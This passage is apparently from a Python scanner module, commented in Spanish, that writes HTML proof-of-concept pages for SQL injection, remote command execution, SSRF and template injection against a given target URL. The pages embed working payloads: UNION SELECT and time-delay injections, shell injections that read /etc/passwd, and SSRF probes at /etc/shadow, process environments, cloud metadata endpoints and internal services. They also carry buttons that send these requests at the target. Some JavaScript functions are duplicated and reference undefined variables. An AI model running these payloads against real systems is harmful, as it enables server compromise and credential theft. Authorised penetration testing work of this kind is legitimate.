            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT NULL,NULL,NULL--")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT NULL,NULL,NULL--")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT user(),database(),version()--")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT user(),database(),version()--")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "'; WAITFOR DELAY '00:00:05'--")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "'; WAITFOR DELAY '00:00:05'--")}</option>
        </select>
        <div id="selectedPayload" style="background: #e74c3c; color: white; padding: 5px; margin: 5px 0; border-radius: 3px; font-family: monospace; word-break: break-all;">
            <strong>Method:</strong> {method}<br>
            <strong>URL:</strong> {target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1 --")}
        </div>
    </div>
    
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="copyUrl()">📋 Copy URL</button>
    <button class="button" onclick="copyPayload()">📋 Copy Payload</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showDetails()">📊 Show Details</button>
    
    <div id="analysis" class="analysis" style="background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none;">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> SQL Injection</p>
        <p><strong>Risk Level:</strong> CRITICAL</p>
        <p><strong>Impact:</strong> Unauthorized database access, data manipulation, potential data breach</p>
        <p><strong>Affected Parameter:</strong> Database query parameter</p>
        <p><strong>Detection Method:</strong> SQL syntax injection in user input</p>
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li>Authentication bypass</li>
            <li>Data extraction</li>
            <li>Database enumeration</li>
            <li>Privilege escalation</li>
        </ul>
        <div class="warning" style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0;">
            <strong>⚠️ Warning:</strong> SQL Injection can lead to complete database compromise. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="details" class="details" style="background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace;">
        <h3>📊 SQL Injection Details</h3>
        <p><em>This shows what a successful SQL injection might reveal:</em></p>
        <div style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px;">
<strong>Database Information:</strong>
• Database Type: MySQL/PostgreSQL
• Version: 5.7.33
• Current User: root@localhost

<strong>Sample Data Extraction:</strong>
• Users table: admin, user1, user2
• Passwords: (hashed)
• Email addresses: admin@example.com

<strong>Error Messages:</strong>
• You have an error in your SQL syntax
• Unknown column 'xyz' in 'field list'
• Access denied for user 'root'@'localhost'
        </div>
        <p><strong>Note:</strong> This is simulated content. The actual response will depend on the database structure and security configuration.</p>
    </div>
    
    <script>
        function updatePayload() {{
            const select = document.getElementById('payloadSelect');
            const display = document.getElementById('selectedPayload');
            display.innerHTML = '<strong>Method:</strong> {method}<br><strong>URL:</strong> ' + select.value;
        }}
        
        function copyPayload() {{
            const select = document.getElementById('payloadSelect');
            const payload = select.value;
            navigator.clipboard.writeText(payload).then(function() {{
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying payload: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = payload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            const url = selectedVuln ? selectedVuln.url : '';
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const url = selectedVuln ? selectedVuln.url : '';
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
</body>
</html>
        """
        
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_sqli.html"
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ SQLi PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_rce_poc(self, target_url, method="GET", screenshot=False, domain=None):
        """Genera PoC para RCE"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en la URL para evitar sobrescribir PoCs
        import hashlib
        url_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>RCE PoC - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #e74c3c; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #e74c3c; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .payload {{ background: #2c3e50; color: #ecf0f1; padding: 15px; margin: 15px 0; border-radius: 5px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Remote Code Execution (RCE) PoC</h1>
        <p>Target: <strong>{html.escape(target_url)}</strong></p>
        <p>Method: <strong>{method}</strong></p>
    </div>
    
    <div class="url-box">
        <strong>Vulnerable URL:</strong><br>
        {html.escape(target_url)}
    </div>
    
    <div class="payload">
        <strong>RCE URLs to test:</strong><br>
        <select id="payloadSelect" onchange="updatePayload()" style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: white;">
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '| ifconfig')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '| ifconfig')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '& cat /etc/passwd')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '& cat /etc/passwd')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '&& whoami')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '&& whoami')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '; echo \'Neluxmatizer\'')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '; echo \'Neluxmatizer\'')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '| whoami')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '| whoami')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '& id')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '& id')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '&& pwd')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '&& pwd')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '; ls -la')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '; ls -la')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '| cat /etc/hostname')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '| cat /etc/hostname')}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', '& uname -a')}">{target_url.replace('PAYLOAD_PLACEHOLDER', '& uname -a')}</option>
        </select>
        <div id="selectedPayload" style="background: #e74c3c; color: white; padding: 5px; margin: 5px 0; border-radius: 3px; font-family: monospace; word-break: break-all;">
            <strong>Method:</strong> {method}<br>
            <strong>URL:</strong> {target_url.replace('PAYLOAD_PLACEHOLDER', '| ifconfig')}
        </div>
    </div>
    
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="copyUrl()">📋 Copy URL</button>
    <button class="button" onclick="copyPayload()">📋 Copy Payload</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showDetails()">📊 Show Details</button>
    
    <div id="analysis" class="analysis" style="background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none;">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> Remote Code Execution (RCE)</p>
        <p><strong>Risk Level:</strong> CRITICAL</p>
        <p><strong>Impact:</strong> Complete server compromise, unauthorized command execution</p>
        <p><strong>Affected Parameter:</strong> Command execution parameter</p>
        <p><strong>Detection Method:</strong> Command injection in user input</p>
        <p><strong>Common Attack Vectors:</strong></p>
        <ul>
            <li>Command injection</li>
            <li>Code injection</li>
            <li>Shell execution</li>
            <li>System command execution</li>
        </ul>
        <div class="warning" style="background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0;">
            <strong>⚠️ Warning:</strong> RCE can lead to complete server compromise. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="details" class="details" style="background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace;">
        <h3>📊 RCE Details</h3>
        <p><em>This shows what a successful RCE attack might reveal:</em></p>
        <div style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px;">
<strong>Command Execution:</strong>
• System information: uname -a
• User information: whoami
• Directory listing: ls -la
• Process list: ps aux

<strong>Common Payloads:</strong>
• ; cat /etc/passwd
• | whoami
• `id`
• $(ls -la)

<strong>Impact Examples:</strong>
• Server file system access
• User data compromise
• System configuration exposure
• Backdoor installation
        </div>
        <p><strong>Note:</strong> This is simulated content. The actual response will depend on the server's security configuration.</p>
    </div>
    
    <script>
        function updatePayload() {{
            const select = document.getElementById('payloadSelect');
            const display = document.getElementById('selectedPayload');
            display.innerHTML = '<strong>Method:</strong> {method}<br><strong>URL:</strong> ' + select.value;
        }}
        
        function copyPayload() {{
            const select = document.getElementById('payloadSelect');
            const payload = select.value;
            navigator.clipboard.writeText(payload).then(function() {{
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying payload: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = payload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            if (details.style.display === 'none' || details.style.display === '') {{
                details.style.display = 'block';
            }} else {{
                details.style.display = 'none';
            }}
        }}
        
        function openInNewTab() {{
            const url = selectedVuln ? selectedVuln.url : '';
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const url = selectedVuln ? selectedVuln.url : '';
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
</body>
</html>
        """
        
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_rce.html"
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ RCE PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_ssrf_poc(self, vulnerable_urls, screenshot=False, domain=None, oob_domain=None):
        """Genera PoC para SSRF con múltiples URLs vulnerables
        Genera PoCs separados según si hay OOB o no
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Asegurar que vulnerable_urls es una lista
        if not isinstance(vulnerable_urls, list):
            vulnerable_urls = [vulnerable_urls] if vulnerable_urls else []
        
        if not vulnerable_urls:
            return {
                'html_path': None,
                'screenshot_path': None,
                'html_filename': None,
                'screenshot_filename': None,
                'error': 'No vulnerable URLs provided'
            }
        
        # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
            else:
                base_domain = "unknown"
        
        # Limpiar el dominio para usar en el nombre del archivo
        clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_').replace('www.', '').replace('.', '_')
        
        # Crear nombre de archivo basado en el dominio y si hay OOB
        if oob_domain:
            html_filename = f"{clean_domain}_ssrf_oob.html"
        else:
            html_filename = f"{clean_domain}_ssrf.html"
        
        # Payloads SSRF comunes
        ssrf_payloads = [
            'file:///etc/passwd',
            'http://127.0.0.1',
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080',
            'file:///etc/shadow',
            'http://127.0.0.1:3306',
            'http://169.254.169.254/latest/user-data/',
            'http://localhost:6379',
            'file:///proc/self/environ',
            'http://metadata.google.internal/computeMetadata/v1/'
        ]
        
        # Si hay OOB, agregar payloads OOB al inicio
        if oob_domain:
            if not oob_domain.startswith("http"):
                oob_domain = "http://" + oob_domain
            oob_payloads = [
                oob_domain,
                f"{oob_domain}/test",
                f"{oob_domain}/?test=1",
                f"{oob_domain}/#test",
                f"http://{oob_domain.replace('http://', '').replace('https://', '')}",
                f"https://{oob_domain.replace('http://', '').replace('https://', '')}",
            ]
            ssrf_payloads = oob_payloads + ssrf_payloads
        
        # Procesar las URLs vulnerables y generar payloads
        import json
        from urllib.parse import urlparse, parse_qs, urlencode, quote
        
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            parsed = urlparse(vuln_url)
            params = parse_qs(parsed.query)
            
            # Encontrar el parámetro que contiene el payload SSRF
            ssrf_param = None
            for param_name in params:
                param_value = params[param_name][0] if params[param_name] else ''
                # Buscar indicadores de payload SSRF en el valor del parámetro
                if any(payload in param_value.lower() for payload in ['127.0.0.1', 'localhost', 'file://', '169.254', 'metadata']):
                    ssrf_param = param_name
                    break
            
            # Si no encontramos un parámetro obvio, usar el primero
            if not ssrf_param and params:
                ssrf_param = list(params.keys())[0]
            
            # Generar URLs con diferentes payloads SSRF
            payload_urls = []
            for payload in ssrf_payloads:
                if ssrf_param:
                    new_params = params.copy()
                    new_params[ssrf_param] = [payload]
                    new_query = urlencode(new_params, doseq=True)
                    payload_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                else:
                    # Si no hay parámetros, agregar el payload como parámetro nuevo
                    payload_url = f"{vuln_url}&ssrf_payload={quote(payload)}"
                payload_urls.append({
                    'payload': payload,
                    'url': payload_url
                })
            
            vuln_data.append({
                'index': i,
                'method': 'GET',  # Por defecto, aunque podría ser POST
                'url': vuln_url,
                'param': ssrf_param or 'unknown',
                'payload_urls': payload_urls
            })
        
        # Generar opciones del dropdown para URLs vulnerables
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            dropdown_options.append(f'<option value="{vuln["index"]}">{display_url}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Generar opciones de payload para cada URL
        payload_options_html = []
        for vuln in vuln_data:
            payload_options = []
            for payload_item in vuln['payload_urls']:
                payload_display = payload_item['payload'][:50] + "..." if len(payload_item['payload']) > 50 else payload_item['payload']
                payload_options.append(f'<option value="{html.escape(payload_item["url"])}">{payload_display}</option>')
            payload_options_html.append({
                'index': vuln['index'],
                'options': '\n'.join(payload_options)
            })
        
        # Convertir a JSON para JavaScript
        vuln_data_json = json.dumps(vuln_data)
        payload_options_json = json.dumps({item['index']: item['options'] for item in payload_options_html})
        
        # Generar el HTML del PoC
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SSRF Vulnerability PoC</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
            min-height: 100vh;
        }}
        .header {{
            background: #e74c3c;
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin-bottom: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .dropdown {{
            width: 100%;
            padding: 12px;
            border: 2px solid #bdc3c7;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
            background: #f8f9fa;
        }}
        .payload-select {{
            width: 100%;
            padding: 12px;
            border: 2px solid #f39c12;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
            background: #fff3cd;
        }}
        .button {{
            background: #3498db;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin: 8px;
            font-size: 16px;
            transition: all 0.3s ease;
        }}
        .button:hover {{
            background: #2980b9;
            transform: translateY(-2px);
        }}
        .url-display {{
            background: #2c3e50;
            color: #ecf0f1;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            font-family: monospace;
            word-break: break-all;
            font-size: 14px;
        }}
        .info-box {{
            background: #f8f9fa;
            padding: 15px;
            margin: 15px 0;
            border-radius: 8px;
            border-left: 5px solid #28a745;
        }}
        .warning {{
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Server-Side Request Forgery (SSRF) PoC</h1>
        <p>Found {len(vulnerable_urls)} vulnerable endpoint(s)</p>
        {f'<p style="background: #27ae60; padding: 10px; border-radius: 5px; margin-top: 10px;"><strong>✅ OOB Detection Enabled:</strong> {oob_domain}</p>' if oob_domain else '<p style="background: #f39c12; padding: 10px; border-radius: 5px; margin-top: 10px;"><strong>ℹ️ Standard Detection:</strong> No OOB domain configured</p>'}
    </div>
    
    <div class="container">
        <h2>Select Vulnerable URL</h2>
        <select id="urlSelect" class="dropdown" onchange="updateUrl()">
            {dropdown_html}
        </select>
        
        <h2>Select SSRF Payload</h2>
        <select id="payloadSelect" class="payload-select" onchange="updatePayload()">
            <option value="">Select a payload...</option>
        </select>
        
        <div id="urlDisplay" class="url-display">
            <strong>Selected URL:</strong> <span id="currentUrl">-</span><br>
            <strong>Payload:</strong> <span id="currentPayload">-</span>
        </div>
        
        <div>
            <button class="button" onclick="testSSRF()">🧪 Test SSRF</button>
            <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
            <button class="button" onclick="copyUrl()">📋 Copy URL</button>
            <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
            <button class="button" onclick="showDetails()">📊 Show Details</button>
        </div>
        
        <div id="result" class="url-display" style="display: none; background: #27ae60; color: white;">
            <h3>📊 Test Results</h3>
            <div id="resultContent"></div>
        </div>
        
        <div id="analysis" class="info-box" style="display: none;">
            <h3>🔍 Vulnerability Analysis</h3>
            <p><strong>Vulnerability Type:</strong> Server-Side Request Forgery (SSRF)</p>
            <p><strong>Risk Level:</strong> HIGH</p>
            <p><strong>Impact:</strong> Internal network access, data exfiltration, service enumeration</p>
            <p><strong>Common Attack Vectors:</strong></p>
            <ul>
                <li>Internal service access</li>
                <li>Cloud metadata access</li>
                <li>Local file reading</li>
                <li>Port scanning</li>
            </ul>
        </div>
        
        <div id="details" class="info-box" style="display: none;">
            <h3>📊 SSRF Details</h3>
            <div class="warning">
                <strong>⚠️ Warning:</strong> SSRF can lead to internal network compromise. 
                Use responsibly and only on systems you have permission to test.
            </div>
            <p><strong>Common Payloads:</strong></p>
            <ul>
                <li>file:///etc/passwd - Read local files</li>
                <li>http://127.0.0.1 - Access localhost</li>
                <li>http://169.254.169.254/ - AWS metadata</li>
                <li>http://metadata.google.internal/ - GCP metadata</li>
            </ul>
        </div>
    </div>
    
    <script>
        const vulnData = {vuln_data_json};
        const payloadOptions = {payload_options_json};
        
        function updateUrl() {{
            const urlSelect = document.getElementById('urlSelect');
            const payloadSelect = document.getElementById('payloadSelect');
            const selectedIndex = parseInt(urlSelect.value);
            
            if (selectedIndex >= 0 && vulnData[selectedIndex]) {{
                const vuln = vulnData[selectedIndex];
                document.getElementById('currentUrl').textContent = vuln.url;
                
                // Actualizar opciones de payload
                payloadSelect.innerHTML = '<option value="">Select a payload...</option>';
                if (payloadOptions[selectedIndex]) {{
                    payloadSelect.innerHTML += payloadOptions[selectedIndex];
                }}
                
                // Seleccionar primer payload por defecto
                if (payloadSelect.options.length > 1) {{
                    payloadSelect.selectedIndex = 1;
                    updatePayload();
                }}
            }}
        }}
        
        function updatePayload() {{
            const payloadSelect = document.getElementById('payloadSelect');
            const selectedUrl = payloadSelect.value;
            
            if (selectedUrl) {{
                document.getElementById('currentPayload').textContent = selectedUrl;
                document.getElementById('currentUrl').textContent = selectedUrl;
            }}
        }}
        
        function openInNewTab() {{
            const payloadSelect = document.getElementById('payloadSelect');
            const url = payloadSelect.value;
            if (url) {{
                window.open(url, '_blank');
            }} else {{
                alert('Please select a payload first');
            }}
        }}
        
        function copyUrl() {{
            const payloadSelect = document.getElementById('payloadSelect');
            const url = payloadSelect.value || document.getElementById('currentUrl').textContent;
            
            navigator.clipboard.writeText(url).then(function() {{
                alert('✅ URL copied to clipboard!');
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                alert('✅ URL copied to clipboard!');
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
        
        function testSSRF() {{
            const payloadSelect = document.getElementById('payloadSelect');
            const resultDiv = document.getElementById('result');
            const resultContent = document.getElementById('resultContent');
            const url = payloadSelect.value;
            
            if (!url) {{
                alert('Please select a payload first');
                return;
            }}
            
            resultDiv.style.display = 'block';
            resultContent.innerHTML = '<p>🔄 Testing SSRF vulnerability...</p>';
            
            // Hacer petición fetch a la URL con payload SSRF
            fetch(url, {{
                method: 'GET',
                mode: 'no-cors',  // Para evitar problemas de CORS
                credentials: 'omit'
            }})
            .then(response => {{
                // Con no-cors, no podemos leer la respuesta, pero podemos verificar el estado
                resultContent.innerHTML = '<p><strong>✅ Request sent successfully!</strong></p>' +
                    '<p><strong>URL tested:</strong> ' + url + '</p>' +
                    '<p><strong>Status:</strong> Request completed (response may be blocked by browser CORS policy)</p>' +
                    '<p><strong>Note:</strong> Due to browser security restrictions, the actual response content cannot be displayed here.</p>' +
                    '<p><strong>💡 Tip:</strong> Use browser DevTools Network tab or curl to see the full response:</p>' +
                    '<code style="background: #2c3e50; color: #ecf0f1; padding: 10px; display: block; border-radius: 5px; margin: 10px 0;">' +
                    'curl -v "' + url + '"</code>' +
                    '<p><strong>⚠️ Warning:</strong> If the server makes a request to the payload URL (e.g., http://127.0.0.1), this confirms the SSRF vulnerability.</p>';
            }})
            .catch(error => {{
                resultContent.innerHTML = '<p><strong>❌ Request failed or blocked</strong></p>' +
                    '<p><strong>URL tested:</strong> ' + url + '</p>' +
                    '<p><strong>Error:</strong> ' + error.message + '</p>' +
                    '<p><strong>Note:</strong> This error may be due to:</p>' +
                    '<ul>' +
                    '<li>Browser CORS policy blocking the request</li>' +
                    '<li>Network connectivity issues</li>' +
                    '<li>Server blocking the request</li>' +
                    '</ul>' +
                    '<p><strong>💡 Tip:</strong> Check browser DevTools Console and Network tabs for more details.</p>' +
                    '<p><strong>Alternative test:</strong> Use curl or a proxy tool to test the SSRF directly:</p>' +
                    '<code style="background: #2c3e50; color: #ecf0f1; padding: 10px; display: block; border-radius: 5px; margin: 10px 0;">' +
                    'curl -v "' + url + '"</code>';
            }});
        }}
        
        // Inicializar con la primera URL
        if (vulnData.length > 0) {{
            updateUrl();
        }}
    </script>
</body>
</html>
        """
        
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ SSRF PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_ssti_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para SSTI con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en las URLs para evitar sobrescribir PoCs
        import hashlib
        urls_str = '|'.join(vulnerable_urls)
        url_hash = hashlib.md5(urls_str.encode()).hexdigest()[:8]
        
        # Extraer el dominio base de la primera URL
        from urllib.parse import urlparse
        if vulnerable_urls:
            base_domain = urlparse(vulnerable_urls[0]).netloc
        else:
            base_domain = "unknown"
        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            method = "GET"
            url = vuln_url
            payload = ""
            form_data = None
            
            # Si es un formulario, extraer datos
            if ' => ' in vuln_url:
                method = "POST"
                url_part = vuln_url.split(' => ')[0]
                url = url_part.split()[0]
                form_part = vuln_url.split(' => ')[1]
                try:
                    import ast
                    form_data = ast.literal_eval(form_part)
                    # Extraer payload del primer campo del formulario
                    if form_data:
                        payload = list(form_data.values())[0]
                except:
                    form_data = {}
            else:
                # Extraer payload de la URL
                from urllib.parse import parse_qs, urlparse
                parsed = urlparse(vuln_url)
                query_params = parse_qs(parsed.query)
                if query_params:
                    payload = list(query_params.values())[0][0]
            
            vuln_data.append({
                'index': i,
                'method': method,
                'url': url,
                'payload': payload,
                'form_data': form_data
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
            option_text = f"{vuln['method']} - {display_url} (Payload: {display_payload})"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Generar el HTML del PoC
        import json
